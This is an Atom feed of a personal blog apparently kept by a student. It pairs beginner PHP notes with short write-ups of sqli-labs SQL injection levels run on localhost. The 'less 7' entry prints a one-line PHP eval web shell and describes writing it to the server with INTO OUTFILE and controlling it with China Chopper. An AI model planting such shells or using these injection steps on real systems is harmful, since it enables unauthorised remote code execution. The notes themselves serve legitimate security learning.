<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WELCOME</title>
  
  
  <link href="https://hanovotot.github.io/atom.xml" rel="self"/>
  
  <link href="https://hanovotot.github.io/"/>
  <updated>2022-01-22T12:30:58.024Z</updated>
  <id>https://hanovotot.github.io/</id>
  
  <author>
    <name>JH</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>学习</title>
    <link href="https://hanovotot.github.io/2022/01/19/less%208/"/>
    <id>https://hanovotot.github.io/2022/01/19/less%208/</id>
    <published>2022-01-19T13:59:58.080Z</published>
    <updated>2022-01-22T12:30:58.024Z</updated>
    
    <content type="html"><![CDATA[<p>less8<br>找到注入点，使用id=1‘<br>后面按照前几关的步骤进行，得到结果<br>开始还是得多自己进行手打，对这些代码还是不熟悉，得多练习<br>less 9-10<br>就还是这样子吧，差不多的步骤。</p><p>这三关都可以使用时间盲注的方法来使用。<br>if函数<br>if（1，2，3）<br>若1为真，则执行2，否则执行3<br>通过此方法，通过检测数据库长度，或是数据库的ascii值，以及页面的刷新速度，来检测出数据库<br>以及我们所需。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;less8&lt;br&gt;找到注入点，使用id=1‘&lt;br&gt;后面按照前几关的步骤进行，得到结果&lt;br&gt;开始还是得多自己进行手打，对这些代码还是不熟悉，得多练习&lt;br&gt;less 9-10&lt;br&gt;就还是这样子吧，差不多的步骤。&lt;/p&gt;
&lt;p&gt;这三关都可以使用时间盲注的方法来使用。&lt;br</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less 7</title>
    <link href="https://hanovotot.github.io/2021/11/17/less%207/"/>
    <id>https://hanovotot.github.io/2021/11/17/less%207/</id>
    <published>2021-11-17T07:05:53.449Z</published>
    <updated>2021-11-17T15:15:48.103Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><pre><code> &lt;?php @eval($_POST[pass]);?&gt;</code></pre><h2 id="select-‘something’-into-outfile-‘where’"><a href="#select-‘something’-into-outfile-‘where’" class="headerlink" title="select  ‘something’ into outfile ‘where’"></a>select  ‘something’ into outfile ‘where’</h2><pre><code>  将 something 写入where(where可以是文件也可以是指定的路径//使用双斜线来代替斜线)</code></pre><h2 id="select-load-file（"><a href="#select-load-file（" class="headerlink" title="select load_file（)"></a>select load_file（)</h2><pre><code>  读取本地文件</code></pre><h2 id="解题心得"><a href="#解题心得" class="headerlink" title="解题心得"></a>解题心得</h2><ul><li>首先还是试出？id=1’))–+</li><li>根据题目的提示知道使用outfile函数</li><li>再测出其有三列后，使用outfile函数将一句话病毒写入less7的目录下<br><img src="https://i.loli.net/2021/11/17/gWbGnc7kSF4ALxR.png" alt="屏幕截图 2021-11-17 160632.png"></li><li>将<a href="http://localhost/Less-7/1.php%E8%BE%93%E5%85%A5%E8%87%B3%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa">http://localhost/Less-7/1.php输入至中国菜刀，密码为a</a></li><li>成功</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一句话木马&quot;&gt;&lt;a href=&quot;#一句话木马&quot; class=&quot;headerlink&quot; title=&quot;一句话木马&quot;&gt;&lt;/a&gt;一句话木马&lt;/h2&gt;&lt;pre&gt;&lt;code&gt; &amp;lt;?php @eval($_POST[pass]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less 5</title>
    <link href="https://hanovotot.github.io/2021/11/15/less%205/"/>
    <id>https://hanovotot.github.io/2021/11/15/less%205/</id>
    <published>2021-11-15T14:17:53.582Z</published>
    <updated>2021-11-15T15:19:05.398Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p>出现情况：正确时返回一个结果，错误时不返回任何数值</p><p>解题过程:  * 直接使用order by判读出其有三列<br>                * 但无法直接使用联合查询<br>                * 使用了left函数<br><img src="https://i.loli.net/2021/11/15/5aNVF9Q2ZOcCxAn.png" alt="屏幕截图 2021-11-15 223616.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;bool盲注&quot;&gt;&lt;a href=&quot;#bool盲注&quot; class=&quot;headerlink&quot; title=&quot;bool盲注&quot;&gt;&lt;/a&gt;bool盲注&lt;/h2&gt;&lt;p&gt;出现情况：正确时返回一个结果，错误时不返回任何数值&lt;/p&gt;
&lt;p&gt;解题过程:  * 直接使用order by</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>~~初学PHP【4】</title>
    <link href="https://hanovotot.github.io/2021/10/30/php%E5%88%9D%E5%AD%A64/"/>
    <id>https://hanovotot.github.io/2021/10/30/php%E5%88%9D%E5%AD%A64/</id>
    <published>2021-10-30T08:05:51.514Z</published>
    <updated>2021-11-01T14:23:45.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="strlen-函数"><a href="#strlen-函数" class="headerlink" title="strlen() 函数"></a>strlen() 函数</h2><p> 返回值为字符串的长度<br><img src="https://i.loli.net/2021/11/01/NMUxTWXl9pB6agk.png" alt="屏幕截图 2021-11-01 213431.png"><br>     *输出 6</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ul><li> x&lt;&gt;y  为不等于</li><li> x！==y  为绝对不等于（数值或类型不等）   </li><li> x xor y  为x.y有且仅有一个为true则返回true</li><li>x===y 为绝对相等<h2 id="组合比较符"><a href="#组合比较符" class="headerlink" title="组合比较符"></a>组合比较符</h2><ul><li>可以实现两个变量的比较，不限于数值类数据的比较<br> 例如：<pre><code>      $c = $a &lt;=&gt; $b* 如果 $a &gt; $b, 则 $c 的值为 1。* 如果 $a == $b, 则 $c 的值为 0。* 如果 $a &lt; $b, 则 $c 的值为 -1。</code></pre><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2></li><li> ID键从0开始   </li><li>$s=array( “a”,”b”,”c”)</li><li>sort() - 对数组进行升序排列</li><li>rsort() - 对数组进行降序排列</li><li>asort() - 根据关联数组的值，对数组进行升序排列</li><li>ksort() - 根据关联数组的键，对数组进行升序排列</li><li>arsort() - 根据关联数组的值，对数组进行降序排列</li><li>krsort() - 根据关联数组的键，对数组进行降序排列</li></ul></li></ul><h2 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h2><pre><code>   * $GLOBALS   * $_SERVER   * $_REQUEST   * $ _POST   * $_FILES   * $_ENV   * $_COOKIE   * $_SESSION  </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;strlen-函数&quot;&gt;&lt;a href=&quot;#strlen-函数&quot; class=&quot;headerlink&quot; title=&quot;strlen() 函数&quot;&gt;&lt;/a&gt;strlen() 函数&lt;/h2&gt;&lt;p&gt; 返回值为字符串的长度&lt;br&gt;&lt;img src=&quot;https://i.lol</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>~~初学PHP【3】</title>
    <link href="https://hanovotot.github.io/2021/10/25/php%E5%88%9D%E5%AD%A63/"/>
    <id>https://hanovotot.github.io/2021/10/25/php%E5%88%9D%E5%AD%A63/</id>
    <published>2021-10-25T15:20:09.098Z</published>
    <updated>2021-10-30T08:09:20.452Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-EOF-heredoc"><a href="#PHP-EOF-heredoc" class="headerlink" title="PHP EOF(heredoc)"></a>PHP EOF(heredoc)</h2><p><img src="https://i.loli.net/2021/10/29/4EH3LlnVYbA8Nuz.png" alt="屏幕截图 2021-10-29 232607.png"><br>  输出<br>        1111<br>        2222</p><ul><li><ol><li>必须后接分号，否则编译通不过。</li></ol></li><li><ol start="2"><li> EOF 可以用任意其它字符代替，开头与结尾需一致。</li></ol></li><li><ol start="3"><li> 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。</li></ol></li></ul><h2 id="php数据类型"><a href="#php数据类型" class="headerlink" title="php数据类型"></a>php数据类型</h2><ul><li><p>整型</p><pre><code>  * 至少一个数字  * ## 无 空格，逗号，小数  * 十进制 十六进制（0x） 八进制（0）</code></pre></li><li><p>浮点型</p><pre><code>  * 带小数部分的数字或是指数</code></pre></li><li><p>布尔型</p><pre><code>用于判断【true || false】</code></pre><p><img src="https://i.loli.net/2021/10/30/q74tCsWlcdFSDNR.png" alt="屏幕截图 2021-10-30 001243.png"></p></li><li><p>数组<br><img src="https://i.loli.net/2021/10/30/WOemZfs7M9XHk3l.png" alt="屏幕截图 2021-10-30 001558.png"></p></li></ul><p>//整形 浮点型 数组    应使用var_dump($x)<br>  注：var _dump返回的是表达式的 类型与值，更利于阅读</p><h2 id="php类型比较"><a href="#php类型比较" class="headerlink" title="php类型比较"></a>php类型比较</h2><pre><code>* 松散比较：只比较值* 严格比较：比较类型与值</code></pre><p><img src="https://i.loli.net/2021/10/30/BvJ6qc3UOp1eGHW.png" alt="屏幕截图 2021-10-30 111308.png"><br>     输出： 1、值相等<br>                3、类型不相等<br>         {“42”为字符串，42为整数 }</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><pre><code>  ！不能由数字开头，不能用$修饰，定义的常量默认为全局变量 设置常量使用define函数（如下）</code></pre><p><img src="https://i.loli.net/2021/10/30/EOhSwI7LtYGDlB9.png" alt="屏幕截图 2021-10-30 112820.png"><br><img src="https://i.loli.net/2021/10/30/Rh7s5eOBb6SJcEi.png" alt="屏幕截图 2021-10-30 114707.png"><br>    输出为:JHNB<br>               JHNB<br>    * 加入true后，可以不计大小写(echo PHP_EOL为换行 )</p><h2 id="并置运行符"><a href="#并置运行符" class="headerlink" title="并置运行符"></a>并置运行符</h2><p><img src="https://i.loli.net/2021/10/30/UfolFbVB3HJrwaQ.png" alt="屏幕截图 2021-10-30 115903.png"></p><h2 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos() 函数"></a>strpos() 函数</h2><ul><li>用于在字符串查找一个字符或一段指定的文本<br><img src="https://i.loli.net/2021/10/30/Uezwf5mvnxCJN4G.png" alt="屏幕截图 2021-10-30 120303.png"><br>返回值为6（从0开始）</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP-EOF-heredoc&quot;&gt;&lt;a href=&quot;#PHP-EOF-heredoc&quot; class=&quot;headerlink&quot; title=&quot;PHP EOF(heredoc)&quot;&gt;&lt;/a&gt;PHP EOF(heredoc)&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>~~php初学【2】</title>
    <link href="https://hanovotot.github.io/2021/09/22/php%E5%88%9D%E5%AD%A62/"/>
    <id>https://hanovotot.github.io/2021/09/22/php%E5%88%9D%E5%AD%A62/</id>
    <published>2021-09-22T04:19:06.000Z</published>
    <updated>2021-10-25T03:52:06.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-global-关键字"><a href="#PHP-global-关键字" class="headerlink" title="PHP global 关键字"></a>PHP global 关键字</h2><pre><code>    用于调用全局变量</code></pre><p><img src="https://i.loli.net/2021/10/24/D3uUJN1RmGxdqcO.png" alt="屏幕截图 2021-10-24 234736.png"></p><p><img src="https://i.loli.net/2021/10/24/7gRKh6ZrITOQpUS.png" alt="屏幕截图 2021-10-24 234750.png"></p><h2 id="Static作用域"><a href="#Static作用域" class="headerlink" title="Static作用域"></a>Static作用域</h2><pre><code>    * 使一个变量在下次调用是仍为上次计算后的值 </code></pre><p><img src="https://i.loli.net/2021/10/24/B5nPqR8l3EbtMWr.png" alt="屏幕截图 2021-10-24 234623.png"></p><h2 id="参数作用域"><a href="#参数作用域" class="headerlink" title="参数作用域"></a>参数作用域</h2><p><img src="https://i.loli.net/2021/10/24/maPWb8u4MEirYLF.png" alt="屏幕截图 2021-10-24 235108.png"><br>     * 需注意 function mytest（$变量）</p><h2 id="echo-和-print-语句"><a href="#echo-和-print-语句" class="headerlink" title="echo 和 print 语句"></a>echo 和 print 语句</h2><pre><code> 二者区别 * echo    可以输出一个至多个字符串 * echo    仅可以输出一个字符串&amp;&amp;返回值为1二者相同* 括号的使用与否均可  </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP-global-关键字&quot;&gt;&lt;a href=&quot;#PHP-global-关键字&quot; class=&quot;headerlink&quot; title=&quot;PHP global 关键字&quot;&gt;&lt;/a&gt;PHP global 关键字&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;    用于调用全局变量
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>~~初学PHP【1】</title>
    <link href="https://hanovotot.github.io/2021/09/22/php%E5%88%9D%E5%AD%A61/"/>
    <id>https://hanovotot.github.io/2021/09/22/php%E5%88%9D%E5%AD%A61/</id>
    <published>2021-09-22T04:09:18.910Z</published>
    <updated>2021-10-24T10:49:05.708Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是PHP"><a href="#什么是PHP" class="headerlink" title="什么是PHP?"></a>什么是PHP?</h2><p>  PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</p><h2 id="开始与结束"><a href="#开始与结束" class="headerlink" title="开始与结束"></a>开始与结束</h2><p>   PHP 脚本以 <?php 开始，以 ?> 结束：<br><img src="https://i.loli.net/2021/10/23/r3LlDfRYIaNT8hv.png" alt="屏幕截图 2021-10-23 114842.png"><br> （同c一样以 ‘ ; ‘ 为结尾）</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>   ‘ // ‘  为行注释</p><pre><code>&#39;  /*(多行内容)*/  &#39;  为块注释</code></pre><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li> 变量规则：</li></ul><p>   变量 以 $ 符号开始，后面跟着变量的名称<br>   变量名 必须以字母或者下划线字符开始<br>   变量名 只能包含字母、数字以及下划线（A-z、0-9 和 _ ）<br>   变量名 不能包含空格<br>   变量名 是区分大小写的（$y 和 $Y 是两个不同的变量）</p><ul><li><p> PHP 语句和 PHP 变量都是区分大小写的。</p></li><li><p>变量作用域<br><img src="https://i.loli.net/2021/10/23/MKcDOJavI8dZHhr.png" alt="屏幕截图 2021-10-23 120735.png"><br>在所有函数外部定义的变量，拥有全局作用域。其可以被脚本中的任何部分访问（访问方法：使用global关键字）</p></li></ul><p><img src="https://i.loli.net/2021/10/23/iK8huHVBAle3XrL.png" alt="屏幕截图 2021-10-23 154905.png"></p><p><img src="https://i.loli.net/2021/10/23/GWjO2s8UDviwz4f.png" alt="屏幕截图 2021-10-23 154956.png"></p><p><img src="https://i.loli.net/2021/10/23/yoJYfpRlv19BQAH.png" alt="屏幕截图 2021-10-23 155035.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;什么是PHP&quot;&gt;&lt;a href=&quot;#什么是PHP&quot; class=&quot;headerlink&quot; title=&quot;什么是PHP?&quot;&gt;&lt;/a&gt;什么是PHP?&lt;/h2&gt;&lt;p&gt;  PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是</summary>
      
    
    
    
    
  </entry>
  
</feed>
